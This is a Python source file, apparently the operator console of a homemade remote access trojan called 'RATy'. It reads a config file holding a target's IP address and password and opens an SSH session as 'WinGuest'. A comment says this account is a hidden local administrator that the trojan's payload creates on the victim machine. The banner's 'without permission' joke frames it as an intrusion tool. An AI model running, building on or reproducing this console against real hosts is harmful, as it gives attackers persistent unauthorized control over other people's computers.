#!/usr/bin/python
# Python console for RATy
# Created By: Muhammad Mohid Mughal

import os
import sys
import getpass
from modules import *

banner = """
      =---===---=   ==-==  ==---====---==  
     *+*    *+*   *+* *+*     *-*     
    *+*    *+*  *+*   *+*    *-*           
   :+*+**+*+:  #_*+=*+*_#   +-*   Y      Y  
  *+*    *+* *+*     *+*   *-*     Y   Y
 *+*    *+* *+*     *+*   *-*        Y
---    --- ---     ---   ---         Y 


        [+] DONT     TRY     AT     HOME  [+]
        [+]    Without Permission ofc     [+]
        [+]     Created By: M. Mohid      [+]
 """

help_menu = """
        Arguments:
                config_file_name.rat = Name of the Configuration File (Containing IP, Pword, Working Directory etc)
        
        
        Examples:
                python3 main.py admin.rat
                        OR
                python3 main.py WinGuest.rat
"""

options_menu = """
        [+] Select one of the Numbers(Under 'Payloads') whose corresponding payload you want to Run [+]

        Payloads:
                [0] Remote Console   
 """

username = getpass.getuser()
header = f"{username}@RATy $ "


# Read Config File
def read_config(config_file):
    configuration = {}

    # Get File Content
    read_lines = open(config_file, "r").readlines()

    # Store and later show Getter Information on Console/Screen
    configuration["IPAddress"] = read_lines[0].strip()
    configuration["Password"] = read_lines[1].strip()
    configuration["WorkingDirectory"] = read_lines[2].strip()

    return configuration


def connect(address, password):
    # remotely connecting/ssh'ing into the getter machine
    response = os.system(f"sshpass -p \"{password}\" ssh WinGuest@{address}")
    #  ^ I have fixed "WinGuest" in place of 'UserName' because we know that the code will make the new local admin with
    # the name of "WinGuest" as it is hardcoded in the code
    if response != 0:
        print(f"Failed to connect to {address}. Error code: {response}")


# Terminates the program by stopping any kind of code execution
def exit_execution():
    sys.exit()


def os_detection():
    # Windows
    if os.name == "nt":
        return "w"
    # Linux
    if os.name == "posix":
        return "l"


# command line interface
def cli(arguments):
    print(banner)
    configuration = {}  # declaring a variable of type 'dictionary'

    # if we get any arguments when calling the file from cli
    if arguments:
        print(options_menu)
        option = input(f"{header}")  # will take the input from sender (through console) e.g: python3 main.py test.rat
        try:  # sends the config file we got through console (as argument) to 'read_config()' so we could extract info
            configuration = read_config(sys.argv[1])  # in upper eg, sys.argv[0] == main.py  && sys.argv[1] == test.rat
        except FileNotFoundError:  # in case the config file the user specified in the command doesn't exists
            print("\n[ /!\\ ] Configuration File Not Found.")
            exit_execution()  # stops the code execution at that point and exits from the 'main.py' file
        # Getting info from Config file ('configuration' variable/dictionary)
        ipv4 = configuration.get("IPAddress")
        password = configuration.get("Password")
        working_directory = configuration.get("WorkingDirectory")

        if option == "0":  # python wasted alot of my time just because initially I used 0, it didn't work, "0" did
            connect(ipv4, password)

    # if arguments are not provided in the command that was used to run this file (from the cmd/shell)
    else:
        print(help_menu)


# main code
def main():
    # Checks for Arguments that whether they were given or not while calling/running the file in the shell
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    # Runs Command Line Interface and tells the cli() that whether we were given Arguments
    # (when running the file from shell) or not
    cli(arguments_exist)


# runs main code
if __name__ == "__main__":
    main()
